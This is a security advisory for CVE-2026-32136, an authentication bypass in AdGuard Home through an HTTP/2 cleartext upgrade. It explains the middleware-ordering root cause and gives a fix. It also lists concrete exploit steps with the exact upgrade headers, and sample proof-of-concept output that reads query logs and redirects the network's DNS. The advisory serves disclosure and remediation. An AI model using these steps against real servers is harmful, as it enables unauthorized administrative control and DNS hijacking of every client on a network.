# AdGuard Home: HTTP/2 Cleartext (h2c) Upgrade Authentication Bypass

**GHSA**: GHSA-5fg6-wrq4-w5gh | **CVE**: CVE-2026-32136 | **Severity**: critical (CVSS 9.8)

**CWE**: CWE-287

**Affected Packages**:
- **github.com/AdguardTeam/AdGuardHome** (go): < 0.107.73

## Description

VULNERABILITY: HTTP/2 Cleartext (h2c) Upgrade Authentication Bypass
========================================================================
Severity:  CRITICAL
CVSS 3.1:  9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
CWE:       CWE-287 (Improper Authentication)
Component: internal/home/web.go
Affected:  AdGuardHome (tested on v0.107.72)

------------------------------------------------------------------------
Summary
------------------------------------------------------------------------

An unauthenticated remote attacker can bypass all authentication in AdGuardHome by sending an HTTP/1.1 request that requests an upgrade to HTTP/2 cleartext (h2c). Once the upgrade is accepted, the resulting HTTP/2 connection is handled by the inner mux, which has no authentication middleware attached. All subsequent HTTP/2 requests on that connection are processed as fully authenticated, regardless of whether any credentials were provided.

------------------------------------------------------------------------
Root Cause
------------------------------------------------------------------------

In internal/home/web.go (approximately lines 268-283), the HTTP server is constructed as follows:
    hdlr := h2c.NewHandler(
        withMiddlewares(web.conf.mux, limitRequestBody),  // no auth
        &http2.Server{},
    )
    web.httpServer = &http.Server{
        Handler: web.auth.middleware().Wrap(hdlr),        // auth here
    }

The authentication middleware wraps the h2c handler at the outer layer. When an h2c upgrade request arrives, the h2c library hijacks the TCP connection and calls http2.ServeConn with Handler set to the inner mux, which was stored at h2c.NewHandler creation time. The authentication middleware is never consulted for any request sent over the resulting HTTP/2 connection. The upgrade request itself passes through because it targets a public path (such as /control/login), which is whitelisted by isPublicResource() in internal/home/authhttp.go. After the upgrade, the attacker can reach any administrative endpoint.

------------------------------------------------------------------------
Proof of Concept
------------------------------------------------------------------------

The PoC script (https://gist.github.com/mandreko/f742d244dfa452e8d00cc5736cf8d629) demonstrates the bypass using a raw TCP connection with HTTP/2 framing. No credentials are provided at any point.

Steps:
  1. Open TCP connection to AdGuardHome (default port 3000).
  2. Send HTTP/1.1 GET /control/login with headers:
       Upgrade: h2c
       Connection: Upgrade, HTTP2-Settings
       HTTP2-Settings: AAMAAABkAAQAAP__
  3. Server responds: 101 Switching Protocols.
  4. Complete HTTP/2 handshake (client preface + SETTINGS exchange).
  5. Send HTTP/2 HEADERS frame requesting GET /control/status on stream 3.
  6. Server responds: HTTP 200 with full JSON status payload.

Sample output (no username or password supplied):
    python3 poc_h2c_auth_bypass.py 192.168.1.15 80 --hijack-dns 8.8.8.8
    ====================================================================
    AdGuardHome -- h2c Authentication Bypass PoC
    CWE-287: Full API access without credentials
    ====================================================================
    Target  : [http://192.168.1.15:80](http://192.168.1.15/)
    Upgrade : /control/login  (whitelisted public path)

    [*] Connecting and performing h2c upgrade ...
    [+] Bypass established -- authentication is not enforced

    [*] GET /control/status
    [+] Version      : v0.107.72
    [+] DNS addresses: ['127.0.0.1', '::1', '192.168.1.15', 'fd64:b28c:45d2:4b5e:d35c:7660:e1b:92', 'fe80::ba65:3afa:617f:f077%eth0']
    [+] HTTP port    : 80
    [+] Protection   : ON

    [*] GET /control/querylog  (DNS query history)
    [+] 10 recent entries:
        2026-03-09T20:42:15  [docker.home.andreko.net](http://docker.home.andreko.net/)                   192.168.1.232
        2026-03-09T20:42:00  [docker.home.andreko.net](http://docker.home.andreko.net/)                   192.168.1.232
        2026-03-09T20:41:45  [docker.home.andreko.net](http://docker.home.andreko.net/)                   192.168.1.232
        2026-03-09T20:41:30  [docker.home.andreko.net](http://docker.home.andreko.net/)                   192.168.1.232
        2026-03-09T20:41:12  [docker.home.andreko.net](http://docker.home.andreko.net/)                   192.168.1.232

    [*] GET /control/dhcp/status  (network device inventory)
    [+] Dynamic leases : 0
    [+] Static leases  : 0

    [*] POST /control/dns_config  (DNS -> 8.8.8.8)
    [+] Upstream DNS changed to 8.8.8.8
    [+] All DNS queries now route through attacker-controlled server

The bypass gives full administrative API access, including:
  - Reading and modifying DNS configuration
  - Adding malicious filter lists
  - Disabling protection
  - Changing the admin password
  - Hijacking DNS resolution for all clients on the network

------------------------------------------------------------------------
Remediation
------------------------------------------------------------------------

Move the authentication middleware inside the h2c handler so it applies to all connections regardless of protocol:
    authedMux := web.auth.middleware().Wrap(
        withMiddlewares(web.conf.mux, limitRequestBody),
    )
    hdlr := h2c.NewHandler(authedMux, &http2.Server{})
    web.httpServer = &http.Server{
        Handler: hdlr,
    }

Alternatively, if h2c support is not required, removing h2c.NewHandler entirely would eliminate the attack surface. HTTP/2 over TLS (h2) is not affected by this vulnerability.
